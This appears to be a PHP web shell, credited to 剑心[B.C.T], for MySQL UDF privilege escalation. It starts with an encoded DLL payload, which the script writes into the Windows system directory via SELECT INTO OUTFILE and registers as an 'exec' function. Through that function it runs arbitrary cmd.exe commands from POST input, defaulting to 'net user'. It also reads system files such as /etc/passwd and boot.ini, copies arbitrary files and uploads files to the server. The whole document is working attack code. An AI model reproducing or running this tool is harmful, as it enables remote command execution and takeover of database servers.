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";



//$mix_path=dirname($_SERVER['COMSPEC'])."\\\\Mysql_mix.dll";


//数据库连接
if($_SESSION["logon"]!="Yes")
{

if (@mysql_connect($servername.":".$serverport,$dbusername,$dbpassword) AND @mysql_select_db($dbname)) 
	{
		echo "数据库连接成功!<br>";
		$_SESSION["logon"]="Yes";
		session_register("servername");
		session_register("serverport");
		session_register("dbusername");
		session_register("dbpassword");
        
	} 
else {
        echo "登陆失败<br>"; 
	 }
}

else echo "数据库连接成功!<br>";

//权限探测
if(mysql_query("select * from mysql.func")) echo "恭喜，权限足够!<br>";
else echo "权限可能不够哦！";

//善前工作
@mysql_query("Drop TABLE jnc_temp");
@mysql_query("DROP FUNCTION exec");

//建立临时表
if(mysql_query("CREATE TABLE jnc_temp (test MEDIUMBLOB)"))
  {echo "临时表建立成功!<br>";}
else {		
	echo mysql_error();
                die();
     }


//系统信息探测
if(strpos(echofile('c:\boot.ini'),'XP')) $system='Xp';
if(strpos(echofile('c:\boot.ini'),'2000')) $system='2000';
if(strstr(echofile('c:\boot.ini'),'2003')) $system='2003';
if(echofile('/etc/passwd')!='') $system='*inx';
session_register("system");
echo "可能是 ".$_SESSION["system"]." 系统<br>";

//临时文件以及系统目录
if($system=='Xp'|| $system=='2003') {$temp="c:\\\\windows"."\\\\temp"."\\\\jnc.txt";$mix_path="c:\\\\windows"."\\\\system32"."\\\\Mysql_mix.dll";}

if($system=='2000') {$temp="c:\\\\winnt"."\\\\temp"."\\\\jnc.txt";$mix_path="c:\\\\winnt"."\\\\system32"."\\\\Mysql_mix.dll";}


//生成Mix.dll
if($_SESSION["mix_ok"]!='Yes')
{
$tmp = base64_decode(gzuncompress(base64_decode($Mixdll)));
$mysql_tmp = "0x".bin2hex($tmp);
//mysql_query("insert into jnc_temp values($mysql_tmp)");
//echo "insert into jnc_temp values('$tmp')";
//die();
if(mysql_query("select $mysql_tmp from jnc_temp into outfile '$mix_path'")) {echo "释放dll到系统目录成功!<br>";session_register("mix_ok");$_SESSION["mix_ok"]='Yes';}

else {echo "释放dll到系统目录失败!可能文件已经存在<br>";
//    echo mysql_error();
//	  $mix_path=$_SERVER["SystemRoot"]."\\\\temp"."\\\\Mysql_mix.dll";
//      echo "尝试释放到系统临时目录<br>";
//	  $fp = fopen($mix_path,"w");
//	  echo $msg=@fwrite($fp,$tmp) ? "尝试释放到系统临时目录成功!<br>" : "尝试释放到系统临时目录失败!<br>";
//      if(@fwrite($fp,$tmp)) {echo "尝试释放到系统临时目录成功!<br>";session_register("mix_ok");$_SESSION["mix_ok"]='Yes';fclose($fp);}
//	  else {echo "尝试释放到系统临时目录失败!<br>";}
//    fclose($fp);
//    die();
	  }
//echo $_SESSION["mix_ok"];
}

else echo "Mix.dll生成成功<br>";



//建立函数$mix_path
if(mysql_query("CREATE FUNCTION exec RETURNS STRING SONAME '$mix_path'"))
echo "函数建立成功<br>";
else echo mysql_error();
?>




<?

if($_POST[file]!='') $file=$_POST[file];

$command="cmd.exe /D /C \"net user"." >"."$temp"."\"";

if($_POST[cmd]!='') $command="cmd.exe /D /C \"".$_POST[cmd]." >$temp"."\"";

//执行命令并且回显结果
if($_POST[cmd]!='') {
if(mysql_query("select exec('$command')"))
echo "执行命令成功<br><br>";
else echo mysql_error();
echo echofile($temp);
@mysql_query("select exec('del $temp')");
}


if($_POST[file]!='')
{
$file=str_replace("\\","/",$file);
echo "文件读取成功<br><br>";
echo echofile($file);
}

if($_POST[sourcefile]!=''&&$_POST[targetfile]!='')
{
$file_temp="0x".bin2hex(reverse_string(echofile($_POST[sourcefile])));
if(mysql_query("select $file_temp from jnc_temp into outfile '$_POST[targetfile]'"))
{
	echo "文件成功从$_POST[sourcefile]复制到$_POST[targetfile]成功！<br>";
}
else {echo mysql_error();echo "文件复制失败，可能目标文件已经存在!<br>";}

}

if($_POST[filepath]!='')
{
	$fp = fopen($_FILES['upload']['tmp_name'],rb);
	$contents = fread ($fp, filesize ($_FILES['upload']['tmp_name']));
    $upload_tmp = "0x".bin2hex($contents);
//    echo $upload_tmp;
	if( mysql_query("select $upload_tmp from jnc_temp into outfile '$_POST[filepath]'") )
    {
     echo "文件成功上传到$_POST[filepath]";
    }
else {echo mysql_error();echo "文件上传失败，请检查目标文件是否已经存在和路径是否正确!<br>";}

}


if ($action!='') logout();

//善后处理
@mysql_free_result($result);
@mysql_query("Drop TABLE jnc_temp");
//@mysql_query("DROP FUNCTION exec");
mysql_close();
?>

<br>
<br>
<br>
<center>All Rights Reserved By 剑心[B.C.T]</center>